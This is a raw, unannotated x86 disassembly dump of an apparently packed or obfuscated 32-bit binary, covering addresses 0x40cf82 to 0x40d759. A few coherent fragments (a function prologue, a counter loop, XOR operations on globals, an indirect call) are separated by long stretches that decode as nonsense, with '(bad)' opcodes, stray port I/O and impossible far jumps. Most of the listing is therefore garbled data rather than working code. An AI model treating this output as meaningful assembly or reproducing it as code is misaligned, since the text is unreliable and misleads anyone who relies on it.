  40cf82:	or     ecx,DWORD PTR [esp+eax*4+0x5ac8c8e0]
  40cf89:	sub    bh,bh
  40cf8b:	pushf  
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	mov    bl,0xd6
  40cfcc:	mov    ds:0x78a72ae0,eax
  40cfd1:	js     0x40d008
  40cfd3:	jle    0x40d04d
  40cfd5:	js     0x40d038
  40cfd7:	rol    DWORD PTR [ebp+0x1f],0x9b
  40cfdb:	inc    esp
  40cfdc:	fs cmc 
  40cfde:	iret   
  40cfdf:	cdq    
  40cfe0:	or     ebx,esi
  40cfe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe3:	stc    
  40cfe4:	imul   eax,DWORD PTR ss:[ebp-0x11],0x1deff8d7
  40cfec:	cdq    
  40cfed:	sub    al,0x14
  40cfef:	lods   eax,DWORD PTR ds:[esi]
  40cff0:	(bad)  
  40cff1:	mov    edx,0xd5d0728e
  40cff6:	enter  0x277a,0xc6
  40cffa:	xor    al,0x3f
  40cffc:	das    
  40cffd:	add    ch,BYTE PTR ds:0xee97da0f
  40d003:	cmp    eax,DWORD PTR [eax]
  40d005:	fisub  DWORD PTR [edi-0x15675034]
  40d00b:	inc    eax
  40d00c:	xlat   BYTE PTR ds:[ebx]
  40d00d:	push   ds
  40d00e:	push   ds
  40d00f:	push   esi
  40d010:	jns    0x40cfc5
  40d012:	ds in  al,dx
  40d014:	jne    0x40d02d
  40d016:	dec    esp
  40d017:	and    bl,BYTE PTR [esi]
  40d019:	jl     0x40cffb
  40d01b:	imul   ebx,DWORD PTR [ebp-0x62],0x42
  40d01f:	ror    BYTE PTR [ebx-0x3d],cl
  40d022:	xchg   ebp,edi
  40d024:	mov    ch,0xba
  40d026:	or     eax,0x31e638d6
  40d02b:	(bad)  
  40d02c:	cmp    edi,DWORD PTR [esi-0x4219a4a1]
  40d032:	dec    ecx
  40d033:	test   al,0xb9
  40d035:	(bad)  
  40d036:	loope  0x40d069
  40d038:	pop    ss
  40d039:	(bad)  
  40d03a:	jae    0x40d0ba
  40d03c:	mov    ecx,0xd2683ae0
  40d041:	sub    eax,0x42e0c153
  40d046:	jl     0x40cfec
  40d048:	push   ebx
  40d049:	mov    bh,0xdd
  40d04b:	lock neg dl
  40d04e:	js     0x40d047
  40d050:	mov    cl,0x2a
  40d052:	fimul  DWORD PTR [edi+0x48]
  40d055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d056:	loopne 0x40d078
  40d058:	and    eax,0x401869e7
  40d05d:	sbb    DWORD PTR ds:0x151fd087,esp
  40d063:	std    
  40d064:	add    eax,DWORD PTR [ecx+0x5ec51907]
  40d06a:	bsf    eax,DWORD PTR [eax+ebx*1+0x203bedad]
  40d072:	sar    DWORD PTR [ecx+ebx*2],cl
  40d075:	jne    0x40d08d
  40d077:	sub    BYTE PTR [eax-0x1ca4d5da],dh
  40d07d:	pop    ebp
  40d07e:	dec    esp
  40d07f:	hlt    
  40d080:	dec    DWORD PTR [ebx+0x24]
  40d083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d084:	fmul   QWORD PTR [ebx]
  40d086:	in     al,dx
  40d087:	std    
  40d088:	adc    dh,BYTE PTR [ebp+ebp*2-0x1ccf7946]
  40d08f:	xor    DWORD PTR [esi],ecx
  40d091:	ret    0x4803
  40d094:	int3   
  40d095:	or     DWORD PTR [ebx-0x70e83aed],eax
  40d09b:	and    eax,0x68f4306a
  40d0a0:	faddp  st(5),st
  40d0a2:	xchg   ebp,eax
  40d0a3:	out    0x77,al
  40d0a5:	pop    es
  40d0a6:	icebp  
  40d0a7:	test   DWORD PTR [ecx+edx*1+0x58],0xed244d4
  40d0af:	sbb    BYTE PTR [ebp+0x55],cl
  40d0b2:	fsub   QWORD PTR [ebx]
  40d0b4:	pop    edx
  40d0b5:	ret    
  40d0b6:	retf   0x205e
  40d0b9:	iret   
  40d0ba:	xor    edi,DWORD PTR [ecx]
  40d0bc:	jb     0x40d096
  40d0be:	dec    ebx
  40d0bf:	fmul   QWORD PTR [ebp+0x3e]
  40d0c2:	ret    0xa043
  40d0c5:	out    0x9a,eax
  40d0c7:	inc    esi
  40d0c8:	mov    eax,?
  40d0ca:	fbld   TBYTE PTR [ecx+0xf]
  40d0cd:	aaa    
  40d0ce:	aad    0x38
  40d0d0:	and    dh,dl
  40d0d2:	adc    eax,0x91855d06
  40d0d7:	mov    bh,0xa0
  40d0d9:	mov    bl,0x86
  40d0db:	ja     0x40d14c
  40d0dd:	and    DWORD PTR [eax-0x7b],esi
  40d0e0:	imul   BYTE PTR ss:0x31cd4823
  40d0e7:	cli    
  40d0e8:	mov    esp,0x91911cc2
  40d0ed:	mov    ebx,gs
  40d0ef:	cli    
  40d0f0:	(bad)  
  40d0f1:	or     eax,DWORD PTR [edx]
  40d0f3:	mov    ecx,0x5b0b3dd0
  40d0f8:	add    DWORD PTR [ebp-0x6226e6a],ecx
  40d0fe:	js     0x40d08e
  40d100:	lods   eax,DWORD PTR ds:[esi]
  40d101:	call   0x1a7e:0x2ff5e6db
  40d108:	cmp    BYTE PTR [edi],dl
  40d10a:	repnz cld 
  40d10c:	sbb    eax,0x47e49500
  40d111:	and    eax,0xea1bfc7f
  40d116:	(bad)  
  40d118:	out    0x33,al
  40d11a:	sub    cl,BYTE PTR ds:0x440f5f20
  40d120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d121:	aam    0x1d
  40d123:	leave  
  40d124:	jmp    0xb987:0x51ab46f6
  40d12b:	aas    
  40d12c:	cmp    BYTE PTR [edx-0x1391efcd],al
  40d132:	pop    esp
  40d133:	into   
  40d134:	cmc    
  40d135:	adc    eax,esi
  40d137:	add    BYTE PTR [ebx+ecx*8-0x13],al
  40d13b:	pop    edx
  40d13c:	cmc    
  40d13d:	sub    edi,esp
  40d13f:	cmp    BYTE PTR [ebx-0x401a170d],ah
  40d145:	cmc    
  40d146:	pop    ds
  40d147:	push   eax
  40d148:	jecxz  0x40d17e
  40d14a:	inc    ebx
  40d14b:	out    dx,al
  40d14c:	fs mov bh,0x4e
  40d14f:	in     al,dx
  40d150:	or     esi,DWORD PTR [ecx]
  40d152:	add    al,0xc4
  40d154:	cmp    ch,ch
  40d156:	neg    DWORD PTR [edx+edx*4]
  40d159:	ds xor ecx,esp
  40d15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d15d:	mov    ah,0x8b
  40d15f:	mov    al,ds:0x2ead58f
  40d164:	adc    ecx,esi
  40d166:	jo     0x40d1d1
  40d168:	inc    ecx
  40d169:	adc    eax,0xfa00a4f7
  40d16e:	sbb    BYTE PTR [ebx],dh
  40d170:	pop    ebx
  40d171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d172:	sbb    eax,0x3052a4d4
  40d177:	leave  
  40d178:	lods   al,BYTE PTR ds:[esi]
  40d179:	push   esi
  40d17a:	push   0xa5fbdad4
  40d17f:	xchg   esp,eax
  40d180:	mov    WORD PTR [eax],fs
  40d182:	(bad)  
  40d183:	iret   
  40d184:	outs   dx,DWORD PTR ds:[esi]
  40d185:	add    BYTE PTR [ebp+0x62],bh
  40d188:	stos   BYTE PTR es:[edi],al
  40d189:	inc    esp
  40d18a:	jecxz  0x40d10c
  40d18c:	nop
  40d18d:	jo     0x40d190
  40d18f:	retf   0x2c34
  40d192:	clc    
  40d193:	mov    ecx,ebp
  40d195:	arpl   WORD PTR [ecx-0x69],cx
  40d198:	push   es
  40d199:	lods   eax,DWORD PTR ds:[esi]
  40d19a:	mov    eax,ds:0x7df093f8
  40d19f:	xor    eax,0x788e93ce
  40d1a4:	and    eax,0xd020f8a9
  40d1a9:	js     0x40d16d
  40d1ab:	add    BYTE PTR [edi+esi*2],0xfd
  40d1af:	inc    ebx
  40d1b0:	js     0x40d1a2
  40d1b2:	jmp    0x8106:0x412872f9
  40d1b9:	sbb    BYTE PTR [ebp+esi*8+0x4657f1aa],cl
  40d1c0:	(bad)
  40d1c4:	push   edx
  40d1c5:	(bad)  
  40d1c6:	jecxz  0x40d17e
  40d1c8:	adc    BYTE PTR [eax+0x42d1f6d8],dh
  40d1ce:	push   edx
  40d1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d0:	pop    esi
  40d1d1:	data16 fbstp TBYTE PTR [eax]
  40d1d4:	xor    bp,WORD PTR [ebx]
  40d1d7:	in     eax,0xab
  40d1d9:	add    al,0x85
  40d1db:	mov    gs,WORD PTR ds:0x73ac167a
  40d1e1:	repnz inc eax
  40d1e3:	loope  0x40d202
  40d1e5:	loopne 0x40d183
  40d1e7:	sub    al,0xf0
  40d1e9:	sbb    al,0x1d
  40d1eb:	(bad)  [ebp+0x73a0e4c6]
  40d1f1:	in     al,dx
  40d1f2:	and    DWORD PTR [ebp+0x76a78291],ebp
  40d1f8:	les    esp,FWORD PTR [esi+ecx*8]
  40d1fb:	call   0xbb44:0x5c6aecff
  40d202:	or     esp,DWORD PTR ds:0x4674ca88
  40d208:	aad    0xf6
  40d20a:	and    DWORD PTR [ecx],ecx
  40d20c:	xchg   ebp,eax
  40d20d:	cmp    dh,bl
  40d20f:	jge    0x40d1eb
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	and    cl,BYTE PTR [esi+ebp*4]
  40d2bc:	fwait
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x8e78787e
  40d2c6:	cmp    edx,DWORD PTR [ecx+0x1]
  40d2c9:	shr    DWORD PTR [esi-0x33],1
  40d2cc:	std    
  40d2cd:	and    DWORD PTR [esi],edx
  40d2cf:	popa   
  40d2d0:	scas   eax,DWORD PTR es:[edi]
  40d2d1:	pushf  
  40d2d2:	pop    eax
  40d2d3:	xor    BYTE PTR [esi-0x3],al
  40d2d6:	xchg   edi,eax
  40d2d7:	out    0x8c,eax
  40d2d9:	lods   eax,DWORD PTR ds:[esi]
  40d2da:	cmp    eax,DWORD PTR [esi+0x30]
  40d2dd:	adc    bh,BYTE PTR [edx]
  40d2df:	int    0x48
  40d2e1:	sub    DWORD PTR [edx-0x6c],ebx
  40d2e4:	cld    
  40d2e5:	xor    BYTE PTR [ecx],0x55
  40d2e8:	inc    edi
  40d2e9:	test   DWORD PTR [edi+ecx*1],esi
  40d2ec:	add    ecx,DWORD PTR ds:0xe8dfebb6
  40d2f2:	sti    
  40d2f3:	jg     0x40d2f5
  40d2f5:	lds    esi,FWORD PTR [ecx-0x14]
  40d2f8:	stos   DWORD PTR es:[edi],eax
  40d2f9:	icebp  
  40d2fa:	fidiv  WORD PTR [esi-0x7d]
  40d2fd:	adc    ebx,DWORD PTR ds:0x187a2e62
  40d303:	dec    ecx
  40d304:	mov    dl,0x8b
  40d306:	xchg   ebx,eax
  40d307:	mov    al,ds:0xf875b104
  40d30c:	dec    edx
  40d30d:	loop   0x40d300
  40d30f:	pop    es
  40d310:	jns    0x40d381
  40d312:	fsubrp st(7),st
  40d314:	daa    
  40d315:	adc    BYTE PTR [ebx-0x3afb7862],dh
  40d31b:	sbb    eax,0xcdd6aa4f
  40d320:	xor    dh,BYTE PTR [ebx+0x2]
  40d323:	or     eax,0xce432861
  40d328:	cmc    
  40d329:	out    dx,al
  40d32a:	jge    0x40d2f3
  40d32c:	cli    
  40d32d:	mov    ds:0xbb028e43,al
  40d332:	sub    bh,BYTE PTR [eax-0x74]
  40d335:	mov    edx,0x8495fa72
  40d33a:	sub    al,0xbc
  40d33c:	bound  eax,QWORD PTR [edi+0x34c439f1]
  40d342:	icebp  
  40d343:	shl    BYTE PTR [esi+edi*4-0x721b8d4f],cl
  40d34a:	jo     0x40d311
  40d34c:	mov    ds:0xa7a28ea8,al
  40d351:	sbb    eax,0xe7b05cee
  40d356:	popa   
  40d357:	retf   
  40d358:	js     0x40d3cf
  40d35a:	inc    esp
  40d35b:	inc    ecx
  40d35c:	or     BYTE PTR [ecx],0x2d
  40d35f:	clc    
  40d360:	xor    al,0xdb
  40d362:	pop    es
  40d363:	or     BYTE PTR [ecx+0x67],al
  40d366:	jbe    0x40d3dc
  40d368:	cmp    BYTE PTR [ebx+0x31ec4698],ch
  40d36e:	ret    0x657
  40d371:	not    BYTE PTR [edi+edi*2]
  40d374:	jmp    0xd084:0x655fce
  40d37b:	mov    WORD PTR [ecx],ss
  40d37d:	mov    ch,0xd
  40d37f:	push   edx
  40d380:	sbb    DWORD PTR [ebx-0x275f8fb3],ecx
  40d386:	xor    bl,bl
  40d388:	inc    esp
  40d389:	push   0x31
  40d38b:	mov    eax,0x89145da6
  40d390:	ins    DWORD PTR es:[edi],dx
  40d391:	sbb    DWORD PTR [edx],esp
  40d393:	xor    eax,eax
  40d395:	jbe    0x40d333
  40d397:	aam    0x48
  40d399:	dec    ebx
  40d39a:	daa    
  40d39b:	mov    ebx,0xa2e21a85
  40d3a0:	inc    esp
  40d3a1:	mov    ds:0xbd9eccd0,al
  40d3a6:	add    DWORD PTR [edx-0x435c9bbb],esi
  40d3ac:	jnp    0x40d373
  40d3ae:	mov    bh,0xb0
  40d3b0:	rcl    eax,0xe4
  40d3b3:	cmc    
  40d3b4:	sub    BYTE PTR [ecx+0x1b],ah
  40d3b7:	mov    eax,0x86cc9cbb
  40d3bc:	js     0x40d347
  40d3be:	bound  eax,QWORD PTR ds:[edi+0xc0276c1]
  40d3c5:	loopne 0x40d349
  40d3c7:	test   BYTE PTR [eax],bl
  40d3c9:	outs   dx,BYTE PTR ds:[esi]
  40d3ca:	inc    ebx
  40d3cb:	cmp    BYTE PTR [ecx-0x7a48c74],ah
  40d3d1:	es sahf 
  40d3d3:	sbb    BYTE PTR [eax+ebp*1-0x4c35b8e6],ch
  40d3da:	push   ds
  40d3db:	xchg   ecx,eax
  40d3dc:	push   cs
  40d3dd:	jno    0x40d364
  40d3df:	out    0xa4,eax
  40d3e1:	and    eax,DWORD PTR [ecx]
  40d3e3:	scas   al,BYTE PTR es:[edi]
  40d3e4:	mov    ebx,0x74199230
  40d3e9:	scas   al,BYTE PTR es:[edi]
  40d3ea:	xchg   BYTE PTR [esi+0x6a],bl
  40d3ed:	adc    ebx,DWORD PTR [ecx-0x6f589aa4]
  40d3f3:	aam    0x10
  40d3f5:	mov    dh,0xff
  40d3f7:	in     al,dx
  40d3f8:	mov    ds:0xfb13306,al
  40d3fd:	icebp  
  40d3fe:	ins    BYTE PTR es:[edi],dx
  40d3ff:	xor    ebp,esi
  40d401:	sbb    eax,0xe5c97267
  40d406:	xor    bh,BYTE PTR [ebp-0xc]
  40d409:	jae    0x40d3cf
  40d40b:	scas   eax,DWORD PTR es:[edi]
  40d40c:	test   ch,cl
  40d40e:	loop   0x40d45c
  40d410:	rcl    BYTE PTR [eax+eax*4-0x78a4e968],1
  40d417:	sbb    edx,ebp
  40d419:	cmp    eax,0x31818e9
  40d41e:	ins    BYTE PTR es:[edi],dx
  40d41f:	(bad)  [edx+0x600892a3]
  40d425:	sbb    al,0xc4
  40d427:	xchg   BYTE PTR [ebx+0x4f8926c3],cl
  40d42d:	sti    
  40d42e:	imul   esi,DWORD PTR [edi+ebp*2-0x43bfac9f],0xffffffb8
  40d436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d437:	mov    cl,0x38
  40d439:	sbb    bh,dh
  40d43b:	adc    al,0xf
  40d43d:	popf   
  40d43e:	mov    bh,0xe3
  40d440:	mov    eax,0x4f08ae17
  40d445:	daa    
  40d446:	jg     0x40d463
  40d448:	aas    
  40d449:	xor    al,0x7c
  40d44b:	dec    ebx
  40d44c:	adc    BYTE PTR [edi],cl
  40d44e:	cmp    BYTE PTR [esi],bl
  40d450:	mov    dh,0x7
  40d452:	jbe    0x40d48b
  40d454:	(bad)  
  40d455:	sbb    edx,DWORD PTR [eax+0x3a]
  40d458:	pushf  
  40d459:	out    dx,al
  40d45a:	in     eax,0x3a
  40d45c:	(bad)  
  40d45d:	jbe    0x40d41e
  40d45f:	push   ds
  40d460:	lock lods eax,DWORD PTR ds:[esi]
  40d462:	clc    
  40d463:	and    BYTE PTR [ebx+0x425e0bb7],dl
  40d469:	iret   
  40d46a:	xchg   edx,eax
  40d46b:	and    eax,0x28f30d0c
  40d470:	das    
  40d471:	das    
  40d472:	mov    edx,0x74554d49
  40d477:	in     eax,dx
  40d478:	mov    ds:0xfba4ac03,al
  40d47d:	aas    
  40d47e:	int3   
  40d47f:	stos   DWORD PTR es:[edi],eax
  40d480:	fild   DWORD PTR [ecx]
  40d482:	sbb    ebp,DWORD PTR [esi-0x1b]
  40d485:	in     al,0x72
  40d487:	outs   dx,DWORD PTR ds:[si]
  40d489:	lahf   
  40d48a:	and    BYTE PTR [ecx],al
  40d48c:	inc    edx
  40d48d:	clc    
  40d48e:	pop    esi
  40d48f:	out    0xff,eax
  40d491:	scas   eax,DWORD PTR es:[edi]
  40d492:	mov    eax,0xaf714ae5
  40d497:	sub    cl,BYTE PTR [edx+0x27]
  40d49a:	xor    al,0xd4
  40d49c:	mov    BYTE PTR [edi+ecx*4],0xb7
  40d4a0:	scas   al,BYTE PTR es:[di]
  40d4a2:	pushf  
  40d4a3:	ja     0x40d489
  40d4a5:	xchg   al,al
  40d4a7:	retf   0x18f7
  40d4aa:	leave  
  40d4ab:	pop    ds
  40d4ac:	(bad)  
  40d4ad:	sub    al,0xc2
  40d4af:	add    edx,esi
  40d4b1:	dec    edi
  40d4b2:	sub    eax,0x7d0c085a
  40d4b7:	outs   dx,BYTE PTR ds:[esi]
  40d4b8:	xor    BYTE PTR [edx],0xef
  40d4bb:	ror    BYTE PTR [ecx-0x2fd913b5],1
  40d4c1:	jg     0x40d4df
  40d4c3:	and    DWORD PTR [ecx+0x21],esp
  40d4c6:	cdq    
  40d4c7:	xchg   edi,eax
  40d4c8:	sub    al,0xe6
  40d4ca:	rol    BYTE PTR [esi],0x4e
  40d4cd:	popf   
  40d4ce:	mov    WORD PTR [eax],cs
  40d4d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d1:	mov    ds:0x3491e031,al
  40d4d6:	fidiv  DWORD PTR [ebp+0x59]
  40d4d9:	(bad)  
  40d4da:	jnp    0x40d47c
  40d4dc:	xchg   edi,eax
  40d4dd:	mov    eax,DWORD PTR [edi]
  40d4df:	and    al,cl
  40d4e1:	repz mov esp,DWORD PTR [edi-0x20]
  40d4e5:	sub    al,BYTE PTR [ebp-0x385beff5]
  40d4eb:	in     eax,dx
  40d4ec:	jo     0x40d474
  40d4ee:	repz push 0x33
  40d4f1:	jne    0x40d546
  40d4f3:	mov    al,ds:0x22eb372f
  40d4f8:	nop
  40d4f9:	sub    eax,DWORD PTR [ebx]
  40d4fb:	push   cs
  40d4fc:	gs and al,0x3d
  40d4ff:	rol    bh,1
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	sub    al,0xbe
  40d577:	pushf  
  40d578:	add    eax,0x7878ab9c
  40d57d:	xor    eax,0xa978787e
  40d582:	adc    al,0xbb
  40d584:	and    BYTE PTR [esi+0x6ccc3aee],dh
  40d58a:	mov    WORD PTR [ecx+0x295fba4],es
  40d590:	xor    al,0x5c
  40d592:	js     0x40d610
  40d594:	(bad)  
  40d595:	out    dx,al
  40d596:	xchg   ebp,eax
  40d597:	(bad)  
  40d598:	xchg   esp,eax
  40d599:	or     BYTE PTR [ecx+ebp*2+0x6b867e72],bl
  40d5a0:	repnz test BYTE PTR ds:0x656e44d9,ah
  40d5a7:	lods   eax,DWORD PTR ds:[esi]
  40d5a8:	and    eax,0x66e9e76e
  40d5ad:	pop    es
  40d5ae:	arpl   sp,cx
  40d5b0:	loope  0x40d570
  40d5b2:	icebp  
  40d5b3:	cs or  al,0x7
  40d5b6:	add    eax,esp
  40d5b8:	jp     0x40d639
  40d5ba:	into   
  40d5bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5bc:	xor    al,0x50
  40d5be:	rcr    bl,cl
  40d5c0:	mov    eax,ds:0x5f3f8f98
  40d5c5:	mov    WORD PTR [esi+0x28],fs
  40d5c8:	and    DWORD PTR [esp+ebx*1-0x21],ecx
  40d5cc:	pop    ebx
  40d5cd:	dec    esi
  40d5ce:	pop    edi
  40d5cf:	and    BYTE PTR [ebp-0x52908aea],al
  40d5d5:	adc    dl,bl
  40d5d7:	nop    DWORD PTR [esi-0x786be179]
  40d5de:	cmp    BYTE PTR [eax+eiz*1],cl
  40d5e1:	int3   
  40d5e2:	ja     0x40d5f5
  40d5e4:	xor    al,0xc3
  40d5e6:	and    DWORD PTR [ebx+0x2e94c09f],ebp
  40d5ec:	push   cs
  40d5ed:	xor    ecx,0x5e
  40d5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f1:	jbe    0x40d666
  40d5f3:	and    ah,BYTE PTR [eax]
  40d5f5:	dec    esi
  40d5f6:	pop    ecx
  40d5f7:	xor    BYTE PTR [eax+0x73],bl
  40d5fa:	sub    DWORD PTR [ebp-0x2a07eef0],ebp
  40d600:	loop   0x40d59a
  40d602:	pop    ecx
  40d603:	int3   
  40d604:	jae    0x40d662
  40d606:	mov    bh,0xa3
  40d608:	pop    ss
  40d609:	adc    al,0x18
  40d60b:	call   0xf50f8c78
  40d610:	sub    al,0xcd
  40d612:	pusha  
  40d613:	or     al,0xde
  40d615:	push   ecx
  40d616:	jg     0x40d654
  40d618:	push   es
  40d619:	mov    esi,0x204d98ed
  40d61e:	ins    DWORD PTR es:[edi],dx
  40d61f:	ss jns 0x40d686
  40d622:	fcomp  QWORD PTR [ebx-0x11]
  40d625:	loop   0x40d603
  40d627:	inc    edx
  40d628:	inc    edx
  40d629:	je     0x40d5b5
  40d62b:	jbe    0x40d64e
  40d62d:	outs   dx,DWORD PTR ds:[esi]
  40d62e:	test   esi,eax
  40d630:	push   esp
  40d631:	mov    esp,esi
  40d633:	cmp    eax,0xb9cbead3
  40d638:	mov    ebp,0xd87d1f8f
  40d63d:	push   ss
  40d63e:	sbb    eax,edi
  40d640:	jg     0x40d5ff
  40d642:	sub    DWORD PTR [edi-0x24],ecx
  40d645:	in     eax,dx
  40d646:	icebp  
  40d647:	xor    BYTE PTR [ecx-0x60391b5c],ah
  40d64d:	enter  0xf16a,0xca
  40d651:	xchg   DWORD PTR [edi+0x2e],eax
  40d654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d655:	mov    ah,0xc6
  40d657:	stos   DWORD PTR es:[edi],eax
  40d658:	push   ds
  40d659:	out    dx,eax
  40d65a:	rcr    bh,1
  40d65c:	cmp    ebp,esi
  40d65e:	out    dx,eax
  40d65f:	daa    
  40d660:	inc    edx
  40d661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d662:	clc    
  40d663:	push   ebp
  40d664:	jmp    0x40d5ed
  40d666:	bnd jmp 0x47fba61b
  40d66c:	and    al,0xda
  40d66e:	in     al,0xcf
  40d670:	or     cx,di
  40d673:	test   BYTE PTR [ebx+0x11],dl
  40d676:	pop    ecx
  40d677:	out    0x35,al
  40d679:	sbb    DWORD PTR [ecx-0x7090d27d],ebx
  40d67f:	loop   0x40d674
  40d681:	sub    cl,BYTE PTR [edx+0x7f]
  40d684:	sub    bh,BYTE PTR [ebx]
  40d686:	pusha  
  40d687:	jne    0x40d6ef
  40d689:	shl    BYTE PTR fs:[ecx-0x369824da],cl
  40d690:	das    
  40d691:	mov    esi,ecx
  40d693:	rol    BYTE PTR [eax],0x50
  40d696:	adc    bh,BYTE PTR [ecx+eiz*8+0x7cea1ba7]
  40d69d:	imul   ebx,DWORD PTR [esi-0x7943343c],0xda7d0994
  40d6a7:	rcl    dl,cl
  40d6a9:	bound  esi,QWORD PTR [esp+edi*1+0x117595d]
  40d6b0:	lods   al,BYTE PTR ds:[esi]
  40d6b1:	jmp    0x3d4559ad
  40d6b6:	mov    ecx,0x4f0b4d73
  40d6bb:	(bad)
  40d6be:	das    
  40d6bf:	mov    ecx,eax
  40d6c1:	stc    
  40d6c2:	ret    0x498a
  40d6c5:	mov    ds:0x6c08ed2f,eax
  40d6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6cb:	fwait
  40d6cc:	inc    eax
  40d6cd:	jno    0x40d700
  40d6cf:	shl    bh,cl
  40d6d1:	jb     0x40d72a
  40d6d3:	repnz arpl si,bp
  40d6d6:	lea    esi,[ebx]
  40d6d8:	xor    al,0x15
  40d6da:	or     dl,dh
  40d6dc:	mov    ah,BYTE PTR [ebx+0x7]
  40d6df:	pop    eax
  40d6e0:	daa    
  40d6e1:	outs   dx,BYTE PTR ds:[esi]
  40d6e2:	push   edi
  40d6e3:	imul   ebp,DWORD PTR [ebp+0x4aab9793],0x2a
  40d6ea:	mov    ah,0xf1
  40d6ec:	retf   
  40d6ed:	jp     0x40d727
  40d6ef:	fidivr DWORD PTR [ebx]
  40d6f1:	cmp    BYTE PTR [esi-0x7c],ah
  40d6f4:	sbb    DWORD PTR [ecx],edx
  40d6f6:	jb     0x40d722
  40d6f8:	sub    BYTE PTR [edx+esi*2],ah
  40d6fb:	retf   0x7ccb
  40d6fe:	xlat   BYTE PTR ds:[ebx]
  40d6ff:	cwde   
  40d700:	sub    BYTE PTR [ebp-0x453bc62c],cl
  40d706:	push   cs
  40d707:	and    al,0xf0
  40d709:	sar    edi,0x54
  40d70c:	icebp  
  40d70d:	shl    DWORD PTR [ebp+edi*1-0x7c6e138c],0xa0
  40d715:	push   edx
  40d716:	(bad)  
  40d717:	cmp    BYTE PTR [esi+0x8],bl
  40d71a:	ret    0x7dec
  40d71d:	shr    BYTE PTR [esp+edx*8],0x1b
  40d721:	add    eax,0x83a9837c
  40d726:	or     bl,bh
  40d728:	or     edx,DWORD PTR [edi-0x115df907]
  40d72e:	(bad)  
  40d730:	out    0x8e,al
  40d732:	xor    eax,0xfbc60e52
  40d737:	add    BYTE PTR [ecx],ah
  40d739:	call   0xe69e8b18
  40d73e:	sbb    BYTE PTR ds:0xa77e56d,bl
  40d744:	int3   
  40d745:	scas   al,BYTE PTR es:[edi]
  40d746:	outs   dx,DWORD PTR ds:[esi]
  40d747:	xchg   edi,eax
  40d748:	in     eax,0xd
  40d74a:	ret    
  40d74b:	stos   BYTE PTR es:[edi],al
  40d74c:	enter  0x2107,0xb6
  40d750:	lods   al,BYTE PTR ds:[esi]
  40d751:	mov    bh,0x2e
  40d753:	mov    DWORD PTR [edi+0x3dd782f2],esi
  40d759:	out    0xbf,eax
